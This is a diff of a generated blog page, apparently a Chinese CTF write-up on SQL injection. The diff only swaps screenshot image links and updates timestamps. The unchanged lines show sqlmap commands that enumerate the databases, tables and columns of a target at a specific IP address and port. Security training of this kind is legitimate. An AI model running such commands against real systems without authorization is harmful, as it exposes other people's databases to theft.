@@ -90,8 +90,8 @@
 <meta property="og:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.imgur.com/8EdgoS3.png">
-<meta property="og:image" content="https://i.imgur.com/JqIhPQS.png">
-<meta property="og:image" content="https://i.imgur.com/qNL5qbg.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png">
 <meta property="og:image" content="https://i.imgur.com/nd1VTmg.png">
 <meta property="og:image" content="https://i.imgur.com/B6oLiAA.png">
 <meta property="og:image" content="https://i.imgur.com/6KXMijL.png">
@@ -99,7 +99,7 @@
 <meta property="og:image" content="https://i.imgur.com/UmyBe7l.png">
 <meta property="og:image" content="https://i.imgur.com/eyqGQZO.png">
 <meta property="og:image" content="https://i.imgur.com/H5rq91S.png">
-<meta property="og:updated_time" content="2019-07-22T05:25:59.913Z">
+<meta property="og:updated_time" content="2019-08-11T06:19:14.685Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="两道sql注入题">
 <meta name="twitter:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
@@ -360,8 +360,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-22T13:25:59+08:00">
-                2019-07-22
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-11T14:19:14+08:00">
+                2019-08-11
               </time>
             
           </span>
@@ -473,10 +473,10 @@
 <p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p>
 <h2>爆数据库</h2>
 <p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
-<p><img src="https://i.imgur.com/JqIhPQS.png" alt="database"></p>
+<p><img src="https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png" alt="8EdgoS3.png"></p>
 <h2>指定数据库报表爆表</h2>
 <p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
-<p><img src="https://i.imgur.com/qNL5qbg.png" alt="table"></p>
+<p><img src="https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png" alt="qNL5qbg.png"></p>
 <h2>指定数据库和表爆字段</h2>
 <p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
 <p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p>
